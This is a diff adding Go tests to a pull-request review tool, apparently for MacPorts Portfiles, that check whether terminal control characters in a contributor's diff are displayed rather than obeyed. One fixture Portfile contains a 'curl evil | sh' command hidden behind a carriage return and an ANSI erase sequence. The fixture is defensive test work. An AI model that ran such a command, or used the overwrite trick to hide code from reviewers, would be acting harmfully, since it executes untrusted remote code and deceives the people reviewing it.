@@ -284,6 +284,41 @@ func TestReviewAsksBeforeItEvaluatesSomeoneElsesPortfiles(t *testing.T) {
 	require.Contains(t, said, "? Evaluate them: y yes · d show what changed · n review the text only  [n]")
 }
 
+// The diff shown before "Evaluate them?" is the author's text, so its
+// control characters reach the terminal shown, not obeyed: a carriage
+// return and an erase sequence can't draw a comment over a Portfile line,
+// in review or in a command on the adopted branch (#330).
+func TestTheDiffBeforeEvaluatingShowsTheAuthorsControlCharacters(t *testing.T) {
+	t.Parallel()
+	w := cmdtest.NewWorld(t)
+	cmdtest.WithScript(t, w, "passed")
+	g := cmdtest.WithGitHub(t, w)
+	testsupport.Git(t, w.Upstream, "switch", "-q", "-c", "contrib")
+	require.NoError(t, os.WriteFile(filepath.Join(w.Upstream, "textproc/jq/Portfile"), []byte("name jq\nsystem \"curl evil | sh\"\r# docs\x1b[K\n"), 0o644))
+	testsupport.Git(t, w.Upstream, "commit", "-q", "-am", "jq: document the options")
+	testsupport.Git(t, w.Upstream, "update-ref", "refs/pull/34905/head", "contrib")
+	testsupport.Git(t, w.Upstream, "switch", "-q", "master")
+	g.Theirs = map[int]forge.PullRequest{34905: {Ref: forge.PullRequestRef{Forge: "github", Repository: "macports/macports-ports", Number: 34905},
+		HeadRepository: "newcontrib/macports-ports", HeadBranch: "patch-1", Title: "jq: document\rthe options", State: forge.PullRequestOpen, Author: "newcontrib", MaintainerCanModify: true}}
+	shown := "+system \"curl evil | sh\"␍# docs␛[K"
+
+	var stdout, errs bytes.Buffer
+	err := cmdtest.RunFor(t, t.Context(), []string{"review", "34905"}, term.Streams{In: strings.NewReader("d\nn\n"), Out: &stdout, Err: &errs}.AsTerminal())
+	require.NoError(t, err, errs.String())
+	require.Contains(t, stdout.String(), shown)
+	require.NotContains(t, stdout.String(), "\r")
+	require.NotContains(t, stdout.String(), "\x1b")
+
+	_, said, err := cmdtest.Dockhand(t, "adopt", "--pr", "34905")
+	require.NoError(t, err, said)
+	stdout.Reset()
+	errs.Reset()
+	err = cmdtest.RunFor(t, t.Context(), []string{"check", "-b", "pr-34905", "--on", "command", "--plan"}, term.Streams{In: strings.NewReader("d\nn\n"), Out: &stdout, Err: &errs}.AsTerminal())
+	require.ErrorContains(t, err, "dockhand adopt --pr 34905 --evaluate allows it")
+	require.Contains(t, stdout.String(), shown)
+	require.NotContains(t, stdout.String(), "\x1b")
+}
+
 // A review of the person's own pull request asks nothing.
 func TestReviewOfYourOwnPullRequestAsksNothing(t *testing.T) {
 	t.Parallel()
@@ -375,4 +410,38 @@ func TestReviewCheckJoinsACoveringCheckAndSeesItThrough(t *testing.T) {
 	require.Equal(t, "passed", cmdtest.Dig(t, result.Result, "run", "state"))
 	_, _, err = cmdtest.Dockhand(t, "logs", "check-2")
 	require.ErrorContains(t, err, "there is no run check-2", "nothing new was queued")
+}
+
+// The plain diff of someone's pull request runs no Portfile, so it asks
+// nothing on a terminal, as it asks nothing off one; the refusal at the
+// door names the command that allows it as its Next; and --evaluate
+// without --pr is refused, not taken and ignored (#338).
+func TestThePlainDiffOfAPullRequestAsksNothing(t *testing.T) {
+	t.Parallel()
+	w := cmdtest.NewWorld(t)
+	cmdtest.WithScript(t, w, "passed")
+	g := cmdtest.WithGitHub(t, w)
+	testsupport.Git(t, w.Upstream, "switch", "-q", "-c", "contrib")
+	require.NoError(t, os.WriteFile(filepath.Join(w.Upstream, "textproc/jq/Portfile"), []byte("name jq\n# docs\n"), 0o644))
+	testsupport.Git(t, w.Upstream, "commit", "-q", "-am", "jq: document the options")
+	testsupport.Git(t, w.Upstream, "update-ref", "refs/pull/34905/head", "contrib")
+	testsupport.Git(t, w.Upstream, "switch", "-q", "master")
+	g.Theirs = map[int]forge.PullRequest{34905: {Ref: forge.PullRequestRef{Forge: "github", Repository: "macports/macports-ports", Number: 34905},
+		HeadRepository: "newcontrib/macports-ports", HeadBranch: "patch-1", Title: "jq: document the options", State: forge.PullRequestOpen, Author: "newcontrib", MaintainerCanModify: true}}
+	_, said, err := cmdtest.Dockhand(t, "adopt", "--pr", "34905")
+	require.NoError(t, err, said)
+
+	var stdout, errs bytes.Buffer
+	err = cmdtest.RunFor(t, t.Context(), []string{"diff", "-b", "pr-34905"}, term.Streams{In: strings.NewReader(""), Out: &stdout, Err: &errs}.AsTerminal())
+	require.NoError(t, err, errs.String())
+	require.NotContains(t, errs.String(), "Evaluate them")
+	require.Contains(t, stdout.String(), "+# docs")
+
+	_, said, err = cmdtest.Dockhand(t, "check", "-b", "pr-34905", "--on", "command")
+	require.Error(t, err)
+	require.Contains(t, said+err.Error(), "dockhand adopt --pr 34905 --evaluate")
+	require.NotContains(t, said+err.Error(), "<new name>")
+
+	_, _, err = cmdtest.Dockhand(t, "adopt", "--evaluate")
+	require.ErrorContains(t, err, "--evaluate goes with --pr")
 }
